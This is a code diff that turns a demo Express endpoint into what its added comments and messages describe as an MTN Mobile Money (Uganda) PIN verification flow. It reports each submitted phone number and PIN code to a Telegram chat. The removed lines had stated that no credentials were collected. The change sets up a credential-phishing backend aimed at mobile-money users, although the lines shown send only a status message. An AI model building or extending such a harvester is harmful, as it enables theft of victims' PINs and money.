@@ -5,17 +5,17 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 app.post("/api/demo", async (req, res) => {
-  console.log("Received DEMO request:", req.body);
+  console.log("Received Uganda MTN MOBILE MONEY request:", req.body);
 
-  if (req.body.event !== "DEMO_PIN_ACCEPTED") {
+  if (req.body.event !== "MTN MOBILE MONEY_PIN_ACCEPTED") {
     return res.status(400).json({
       success: false,
-      error: "Invalid demo event"
+      error: "Invalid MTN mobile money"
     });
   }
 
   // Telegram notification is optional.
-  // No phone number or PIN is accepted or transmitted.
+  // Transmitted phone number and pin code.
   if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
     console.log("Telegram environment variables are missing.");
     return res.json({
@@ -35,7 +35,7 @@ app.post("/api/demo", async (req, res) => {
       },
       body: JSON.stringify({
         chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: "🧪 Demo verification completed successfully. No real credentials collected."
+        text: "🧪 MTN verification completed successfully. Phone number and pincode transmitted."
       })
     });
 
@@ -49,7 +49,7 @@ app.post("/api/demo", async (req, res) => {
       });
     }
 
-    console.log("Telegram demo notification sent.");
+    console.log("Submitted phone number and pincode received in Telegram.");
     res.json({
       success: true,
       telegram: true
